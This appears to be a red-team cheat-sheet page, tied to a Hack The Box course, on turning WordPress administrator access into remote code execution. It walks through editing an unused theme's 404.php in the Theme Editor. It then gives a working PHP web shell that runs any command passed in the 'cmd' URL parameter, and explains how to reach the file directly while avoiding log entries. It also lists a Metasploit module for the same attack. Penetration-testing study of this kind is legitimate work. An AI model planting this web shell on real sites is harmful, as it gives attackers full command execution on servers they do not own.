# WordPress Admin RCE

[![hackingwordpress](../../../../_badges/htb/hackingwordpress.svg)](https://academy.hackthebox.com/course/preview/hacking-wordpress)

<div class="row row-cols-lg-2"><div>

With sufficient privileges, it is possible to exploit a remote code execution (RCE) *vulnerability* on WordPress.

Since admins can modify templates, and templates are written in PHP, we can replace one of them with our code. For instance, a remote shell, meaning we would have a remote command execution (RCE).

Select `Appearance` then `Theme Editor`. Select a theme, preferably one that is not used to avoid breaking things.

Pick a non-critical file such as `404.php` and add to it a [web shell](/cybersecurity/red-team/s3.exploitation/shell/web_shell.md):
</div><div>

```php!
<?php
// add your webshell
echo "<pre>".shell_exec(($_GET['cmd'] ?? "whoami")." 2>&1")."</pre>";
// prevent the rest of the page from showing up
// ‚ö†Ô∏è it may not work, remove it if it doesn't
exit 0;
```

To execute it, aside from accessing an invalid URL which may highlighted in the logs, directly access the file from the theme folder:

```text!
https://<HOST>/wp-content/themes/<theme_name>/404.php
```
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* metasploit `wp_admin_shell_upload`
</div><div>
</div></div>